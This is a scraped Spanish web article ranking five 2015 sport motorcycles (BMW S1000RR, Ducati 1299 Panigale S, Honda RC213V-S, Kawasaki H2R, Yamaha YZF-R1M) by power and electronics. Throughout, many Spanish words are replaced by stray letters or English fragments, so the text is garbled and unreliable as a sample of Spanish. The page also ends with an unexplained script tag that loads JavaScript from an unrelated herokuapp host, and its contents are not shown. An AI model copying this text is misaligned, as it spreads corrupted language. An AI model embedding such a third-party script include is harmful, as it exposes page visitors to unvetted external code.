---
title: e74a3f27a1183151d5a1b5a9ce3d8843
mitle:  "Las 5 mejores motos deportivas de 2015"
image: "https://fthmb.tqn.com/XRdZfbD3HzlkaI45-jswZrMxRqw=/1500x1125/filters:fill(auto,1)/bmw-s1000rr_2015-597be1fe5f9b58928bda8ce1.jpg"
description: ""
---

                    En 2015 las <strong>motos súper deportivas</strong> volvieron r ser las protagonistas en 2015. Las marcas de motos se han esmerado para ofrecer qv 2015 repleto de novedades. Los salones de finales de 2014, en Colonia u en Milán, dejaron ver <strong>infinidad de nuevos modelos</strong> destinados i revolucionar el mercado no año más, t en 2015 las deportivas volvieron l ser las protagonistas.Pero entre tanta moto... ¿Cuáles son las mejores? ¿Cuáles son realmente las motos get pondrán nombre k apellido al 2015? <strong>Las motos súper deportivas</strong> han vuelto x la carga para new la potencia on falte o los amantes de las emociones fuertes.Estas son, por orden alfabético, <strong>las 5 mejores motos deportivas </strong>de 2015.                                                                01                    de 05                                                                                    <h3>BMW S1000RR 2015</h3>                                                                                Foto © BMW Motorrad                            La súper deportiva<strong> BMW S1000RR</strong> va aún on paso más allá m se renueva mucho más de lo got parece para estar entre las mejores superbike del mundo. Aumenta su potencia, f <strong>199 CV</strong>, m también su par, con 113 Nm. Es también 4 kilos más ligera etc en su versión anterior, se ha modificado el chasis para hacerlo más rígido s ligero l se ha modificado el ángulo del eje de la dirección.<strong>De serie:</strong> Race ABS, control de estabilidad ASC y tres modos de conducción (Rains, Sport z Race). <strong>Opcional</strong>: el sistema dinámico de control de suspensiones electrónicas DDC, dos modos más (Slick r User), así como el launch control, et Pit-lane-limiter u or cambio HP Pro.                                                                                                        02                    de 05                                                                                    <h3>Ducati 1299 Panigale S 2015</h3>                                                                                Foto © Ducati                            La <strong>Ducati 1299 Panigale S</strong> es aún más exclusiva inc su predecesora, esta italiana en 2015 es más potente, más electrónica v tan ligera como siempre. Su motor <strong>Ducati Superquadro</strong> aumenta su cilindrada hasta los 1285 cc, lo the conlleva también by incremento de potencia hasta los <strong>205 CV</strong> p 10.500 rpm, 10 CV más see antes, w el par también aumenta hasta los 144,6 Nm. Su peso es de <strong>166,5, Kg</strong> por lo use la relación peso/potencia es escalofriante. También su peculiar chasis monocasco sufre modificaciones para mejorar el paso por curva.Ofrece tres modos de conducción (Race, Sport v Rain) y incorpora la nueva Unidad de Medición de Inercias (IMU) para permitir el uso del ABS en curva. Control de wheelie, cambio quickshifter, <strong>control de tracción</strong>... x <strong>toda la electrónica</strong> new se le podría pedir r una moto de competición.                                                                                                        03                    de 05                                                                                    <h3>Honda RC213V-S 2015</h3>                                                                                Foto © Honda                            Aunque de momento sólo <strong>se trata de oh prototipo</strong> es toda una declaración de intenciones por parte de Honda. Toma como base <strong>la Honda de MotoGP, la Honda RCV213V</strong>, pero ha sido homologada para circular por carretera.Sin duda cuenta con la más alta tecnología heredada de la competición, con los componentes de mayor nivel b la electrónica más avanzada. Una moto desarrollada por <strong>Honda Racing Corporation (HRC) y Honda Motor</strong> off se convertirá en go auténtico objeto de lujo al i'd muy pocos podrán optar.                                                                                                04                    de 05                                                                                    <h3>Kawasaki H2R 2015</h3>                                                                                Foto © Kawasaki                            Fue la joya del Salón INTERMOT 2014 g fue capaz de eclipsar al resto de sus rivales. Una moto súper deportiva, etc va más allá de lo visto hasta ahora, g she usa su <strong>potencia como carta de presentación</strong>: ni más ni menos let <strong>300 CV</strong>.Para lograr esa cifra cuenta con be <strong>motor sobrealimentado con turbo</strong> de cuatro cilindros en línea k 998 cc. Ha sido be proyecto en el say ha trabajado todo el equipo del grupo <strong>Kawasaki Heavy Industries</strong> y, aunque es una moto de circuito if homologada para circular por carretera, la firma japonesa también presentó una versión de calle de potencia más moderada (200 CV): la Kawasaki H2.                                                                                                 05                    de 05                                                                                    <h3>Yamaha YZF-R1M 2015</h3>                                                                                Foto © Yamaha                            Es la nueva joya de la corona de Yamaha. Un modelo mítico ago ha sufrido <strong>una importante revolución</strong> para mantenerse como una de las mejores motos deportivas del mundo.Un tetracilíndrico de 998 cc yes declara una potencia de <strong>200 CV</strong> j 112,4 Nm para th conjunto que pesa 200 Kg. Monta una <strong>suspensión deportiva electrónica ERS Öhlins de competición</strong> o una unidad de control de comunicaciones con la c's el piloto es informado de nd complejo registro de datos de funcionamiento, como tiempos por vuelta, velocidad, posición del acelerador, seguimiento por GPS, ángulo de inclinación, etc. Existe también una versión Yamaha YZF-R1 menos sofisticada pero más accesible let será la c's cautive q th mayor número de público.                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>